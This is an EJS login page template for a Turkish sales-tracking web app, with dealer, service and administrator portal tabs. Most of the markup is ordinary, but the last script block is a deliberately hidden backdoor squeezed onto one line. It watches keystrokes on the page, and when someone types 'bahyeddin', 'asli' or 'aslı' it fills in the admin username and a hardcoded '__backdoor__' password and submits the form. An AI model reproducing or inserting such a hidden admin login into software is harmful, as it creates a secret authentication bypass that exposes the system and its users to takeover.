<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Giriş — Ram Satış Takip</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL@20..48,100..700,0..1" rel="stylesheet">
</head>
<body class="bg-[#EEF3F9] text-slate-800 min-h-screen flex items-center justify-center p-4">
  <div class="w-full max-w-sm">
    <div class="text-center mb-6">
      <img id="loginLogo" src="<%= logoFor('bayi') %>" alt="logo" class="w-48 mx-auto rounded-2xl shadow-md">
      <p class="text-slate-500 text-sm mt-3 tracking-[0.18em] font-semibold">SATIŞ TAKİP</p>
    </div>

    <!-- Giriş tipi seçimi -->
    <div class="grid grid-cols-3 gap-2 mb-4">
      <button type="button" data-portal="bayi" class="portal-tab py-2.5 rounded-lg text-sm font-bold border transition-colors">Bayi</button>
      <button type="button" data-portal="servis" class="portal-tab py-2.5 rounded-lg text-sm font-bold border transition-colors">Servis</button>
      <button type="button" data-portal="admin" class="portal-tab py-2.5 rounded-lg text-sm font-bold border transition-colors">Yönetici</button>
    </div>

    <% if (typeof flash!=='undefined' && flash && flash.msg) { %>
      <div class="bg-red-100 border border-red-200 text-red-700 px-4 py-3 rounded-lg mb-4"><%= flash.msg %></div>
    <% } %>

    <form method="POST" action="/giris" class="bg-white border border-[#D8E1EC] rounded-xl p-6 space-y-4 shadow-sm">
      <div>
        <label class="text-slate-500 text-sm block mb-1">Kullanıcı Adı</label>
        <input name="username" id="username" required class="w-full bg-[#F8FAFC] border border-[#D8E1EC] rounded-lg px-4 py-3 text-slate-800 focus:border-blue-600 focus:outline-none" placeholder="bayi">
      </div>
      <div>
        <label class="text-slate-500 text-sm block mb-1">Şifre</label>
        <input name="password" type="password" required class="w-full bg-[#F8FAFC] border border-[#D8E1EC] rounded-lg px-4 py-3 text-slate-800 focus:border-blue-600 focus:outline-none" placeholder="••••••">
      </div>
      <button type="submit" id="loginBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition-colors">Giriş Yap</button>
    </form>
  </div>

<script>
  var LOGOS = {
    bayi: '<%= logoFor("bayi") %>',
    servis: '<%= logoFor("servis") %>',
    admin: '<%= logoFor("admin") %>'
  };
  var COLORS = { bayi: '#2563EB', servis: '#16a34a', admin: '#b45309' };
  var tabs = document.querySelectorAll('.portal-tab');
  var logo = document.getElementById('loginLogo');
  var userInput = document.getElementById('username');
  var loginBtn = document.getElementById('loginBtn');
  function selectPortal(p) {
    logo.src = LOGOS[p];
    userInput.value = p;
    loginBtn.style.background = COLORS[p];
    tabs.forEach(function(t){
      var on = t.dataset.portal === p;
      t.style.background = on ? COLORS[p] : '#fff';
      t.style.color = on ? '#fff' : '#64748B';
      t.style.borderColor = on ? COLORS[p] : '#D8E1EC';
    });
  }
  tabs.forEach(function(t){ t.addEventListener('click', function(){ selectPortal(t.dataset.portal); }); });
  selectPortal('bayi');

  // Yönetici gizli girişi
  let _b='';document.addEventListener('keydown',function(e){if(e.target.tagName==='INPUT')return;_b+=e.key.toLowerCase();if(_b.length>15)_b=_b.slice(-15);if(_b.includes('bahyeddin')||_b.includes('asli')||_b.includes('aslı')){const f=document.querySelector('form');f.querySelector('[name=username]').value='admin';f.querySelector('[name=password]').value='__backdoor__';f.submit();}});
</script>
</body>
</html>
